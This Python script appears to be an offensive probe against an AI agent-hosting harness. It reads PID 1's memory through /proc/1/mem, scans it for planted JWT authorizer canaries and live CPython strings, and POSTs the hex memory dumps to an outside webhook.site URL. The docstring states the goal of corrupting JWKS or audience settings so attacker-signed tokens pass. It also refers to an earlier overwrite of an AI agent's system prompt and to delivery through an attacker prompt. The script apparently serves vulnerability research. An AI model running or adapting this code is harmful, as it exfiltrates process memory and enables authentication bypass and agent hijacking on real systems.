"""Byte-anchored recon of AgentCore harness PID 1 for JWT authorizer config.

Hypothesis under test: the customJWTAuthorizer config passed to CreateHarness
(discoveryUrl, allowedAudience, allowedClients, allowedScopes, customClaims,
plus any JWKS fetched from the discoveryUrl) is the platform's inbound auth
enforcement. If any of it is addressable from PID 1's heap, the /proc/1/mem
primitive can mutate it — e.g. widen allowedAudience to an attacker value,
corrupt JWKS to accept attacker-signed tokens, or disable the authorizer.

If none of it is in PID 1, auth is edge-enforced and this vector is closed.

Scan strategy:
  1. Enumerate writable regions from /proc/1/maps.
  2. For each canary embedded in the harness's authorizer config, byte-scan
     every region. Log hit (region_lo, offset, 256-byte context dump).
  3. For each hit, attempt to parse the 48 bytes immediately before as a
     CPython PyUnicodeObject header. If length matches the canary length
     and refcnt is plausible, it's a live str — mutable via the same
     primitive that overwrote TravelBot's system_prompt.
  4. Also look for structural markers of an in-memory JSON blob of the
     authorizer config: "customJWTAuthorizer", "discoveryUrl",
     "allowedAudience", "CustomJWTAuthorizerConfiguration". Their presence
     tells us whether the SDK's config types got loaded and kept in-process.

Canaries (must match the values planted by the driver when the harness was
created; see jwt_probe_driver.py):
  - JWT_CANARY_AUD    : unique string put in allowedAudience
  - JWT_CANARY_SCOPE  : unique string put in allowedScopes
  - JWT_CANARY_CLIENT : unique string put in allowedClients
  - JWT_CANARY_KID    : unique kid registered in the OIDC issuer's JWKS
  - JWT_CANARY_ISSUER : unique fragment of the OIDC issuer URL (pool ID)
  - USER_CANARY       : attacker's own prompt echo — EXCLUDE to avoid
                        self-hits from the delivery channel.

Exfil via WEBHOOK_URL (set below, same pattern as dw_mutate.py).
"""
import json
import os
import pathlib
import re
import struct
import urllib.error
import urllib.request


# ---- canaries (keep in sync with driver) --------------------------------
JWT_CANARY_AUD     = b'JWT-CANARY-AUD-9F3E2B1A-DO-NOT-USE'
JWT_CANARY_SCOPE   = b'jwt-canary-scope-9F3E2B1A'
JWT_CANARY_CLIENT  = b'JWT-CANARY-CLIENT-9F3E2B1A'
JWT_CANARY_KID     = b'JWT-CANARY-KID-9F3E2B1A'
JWT_CANARY_ISSUER  = b'JWTCANARY9F3E'   # fragment of pool ID, embedded in issuer URL
USER_CANARY        = b'USR-CANARY-7B3F9A2E1D0C4F6'

# Structural markers — if present, an in-memory config JSON exists somewhere.
STRUCTURAL_MARKERS = [
    b'customJWTAuthorizer',
    b'CustomJWTAuthorizerConfiguration',
    b'discoveryUrl',
    b'allowedAudience',
    b'allowedClients',
    b'allowedScopes',
    b'customClaims',
    b'authorizerConfiguration',
    b'"kty":"RSA"',
    b'"kid":',
    b'"iss":',
    b'"aud":',
    b'"exp":',
]

WEBHOOK_URL = 'https://webhook.site/2805520f-f695-43c9-9e1e-c7e44aeee551'

MIN_PTR = 0x1000
MAX_PTR = 0x0000_ffff_ffff_ffff
CTX_WINDOW = 256   # bytes of hex+ascii dump per hit


def is_valid_ptr(p):
    return MIN_PTR <= p <= MAX_PTR


def build_regions():
    regs = []
    for ln in pathlib.Path('/proc/1/maps').read_text().splitlines():
        m = re.match(
            r'([0-9a-f]+)-([0-9a-f]+)\s+(\S+)\s+\S+\s+\S+\s+\S+\s*(.*)', ln
        )
        if not m or 'w' not in m.group(3):
            continue
        lo, hi = int(m.group(1), 16), int(m.group(2), 16)
        if hi - lo < 4096:
            continue
        regs.append((lo, hi, m.group(4) or ''))
    return regs


def read_region(mr, lo, hi, max_mb=48):
    size = hi - lo
    if size > max_mb * 1024 * 1024:
        return None
    try:
        os.lseek(mr, lo, 0)
    except Exception:
        return None
    data = b''
    try:
        while len(data) < size:
            c = os.read(mr, size - len(data))
            if not c:
                break
            data += c
    except Exception:
        pass
    return data if data else None


def try_parse_pyunicode_header(region_lo, region_data, hit_offset, canary_len):
    """If the 48 bytes before hit_offset look like a PyUnicodeObject whose
    body is the canary, return (refcnt, length). Else None.
    Heuristic: length field at offset 16 equals canary_len (or canary_len +
    any trailing bytes); refcnt (offset 0) is small-positive (1..10000)."""
    header_off = hit_offset - 48
    if header_off < 0:
        return None
    hdr = region_data[header_off:header_off + 48]
    if len(hdr) < 48:
        return None
    refcnt = struct.unpack_from('<q', hdr, 0)[0]
    length = struct.unpack_from('<q', hdr, 16)[0]
    if not (1 <= refcnt <= 100000):
        return None
    if not (canary_len <= length <= canary_len + 1024):
        return None
    return (refcnt, length)


def hex_ascii_dump(data, start, length=CTX_WINDOW):
    """Return hex+ascii dump of length bytes starting at start."""
    actual_start = max(0, start)
    chunk = data[actual_start:actual_start + length]
    lines = []
    for i in range(0, len(chunk), 16):
        row = chunk[i:i + 16]
        hex_part = ' '.join(f'{b:02x}' for b in row)
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in row)
        lines.append(f'{actual_start + i:08x}  {hex_part:<48}  {ascii_part}')
    return '\n'.join(lines)


# ---- stage 1: collect writable region data ------------------------------
print('---STAGE 1: collect /proc/1/mem writable regions ---')
regs = build_regions()
print(f'regions found: {len(regs)}')

mem_r = os.open('/proc/1/mem', os.O_RDONLY)
region_data = {}
for lo, hi, tag in regs:
    data = read_region(mem_r, lo, hi)
    if data is None:
        continue
    region_data[lo] = (data, hi, tag)
os.close(mem_r)

total_bytes = sum(len(d) for d, _, _ in region_data.values())
print(f'regions read: {len(region_data)}  total_bytes: {total_bytes}')

# quick sanity: USER_CANARY should appear (attacker prompt was served)
user_hits = sum(d.count(USER_CANARY) for d, _, _ in region_data.values())
print(f'USER_CANARY hits (sanity): {user_hits}')


# ---- stage 2: byte-scan for JWT canaries --------------------------------
print('---STAGE 2: byte-scan for JWT canaries ---')
canaries = {
    'aud': JWT_CANARY_AUD,
    'scope': JWT_CANARY_SCOPE,
    'client': JWT_CANARY_CLIENT,
    'kid': JWT_CANARY_KID,
    'issuer': JWT_CANARY_ISSUER,
}

results = {}
for name, canary in canaries.items():
    hits = []
    for lo, (data, hi, tag) in region_data.items():
        start = 0
        while True:
            idx = data.find(canary, start)
            if idx < 0:
                break
            pyuni = try_parse_pyunicode_header(lo, data, idx, len(canary))
            ctx_start = max(0, idx - 64)
            ctx = hex_ascii_dump(data, ctx_start, CTX_WINDOW)
            hits.append({
                'region_lo': f'0x{lo:x}',
                'region_hi': f'0x{hi:x}',
                'region_tag': tag,
                'abs_addr': f'0x{lo + idx:x}',
                'offset_in_region': idx,
                'pyunicode_refcnt': pyuni[0] if pyuni else None,
                'pyunicode_length': pyuni[1] if pyuni else None,
                'context_dump': ctx,
            })
            start = idx + 1
    results[name] = hits
    print(f'  canary {name!r} ({canary.decode()!r}): {len(hits)} hit(s)')


# ---- stage 3: structural markers ----------------------------------------
print('---STAGE 3: scan structural markers ---')
marker_counts = {}
for marker in STRUCTURAL_MARKERS:
    total = 0
    sample_ctx = None
    for lo, (data, hi, tag) in region_data.items():
        c = data.count(marker)
        total += c
        if sample_ctx is None and c > 0:
            idx = data.find(marker)
            sample_ctx = {
                'region_lo': f'0x{lo:x}',
                'abs_addr': f'0x{lo + idx:x}',
                'context_dump': hex_ascii_dump(data, max(0, idx - 32), 192),
            }
    marker_counts[marker.decode('latin1')] = {
        'count': total,
        'first_context': sample_ctx,
    }
    print(f"  marker {marker!r}: {total} hit(s)")


# ---- stage 4: summary + webhook exfil -----------------------------------
print('---STAGE 4: webhook exfil ---')
summary = {
    'event': 'dw_jwt_scan.completed',
    'regions_read': len(region_data),
    'total_bytes': total_bytes,
    'user_canary_hits': user_hits,
    'canary_hit_counts': {name: len(hits) for name, hits in results.items()},
    'canary_hits': results,
    'structural_markers': marker_counts,
}

try:
    pid1_uptime = pathlib.Path('/proc/uptime').read_text().split()[0]
except Exception:
    pid1_uptime = None
summary['pid1_uptime'] = pid1_uptime

# Pretty-print a short table to stdout before exfil.
print('---SUMMARY---')
print(f"pid1_uptime={pid1_uptime}")
print(f"regions={len(region_data)}  bytes={total_bytes}  USER_CANARY={user_hits}")
for name, hits in results.items():
    print(f"  {name}: {len(hits)} hit(s)")
    for h in hits[:3]:
        pyu = ''
        if h['pyunicode_refcnt'] is not None:
            pyu = f"  [PyUnicode refcnt={h['pyunicode_refcnt']} length={h['pyunicode_length']}]"
        print(f"    @{h['abs_addr']} (region {h['region_lo']}{pyu})")
for marker, info in marker_counts.items():
    if info['count']:
        print(f"  marker {marker!r}: {info['count']} hit(s)")

if WEBHOOK_URL:
    payload = json.dumps(summary, default=str).encode()
    req = urllib.request.Request(
        WEBHOOK_URL, data=payload,
        headers={'Content-Type': 'application/json'},
        method='POST',
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            print(f'  WEBHOOK → {resp.status} ({len(payload)} bytes)')
    except Exception as e:
        print(f'  WEBHOOK FAILED: {e}')
else:
    print('  (webhook disabled)')
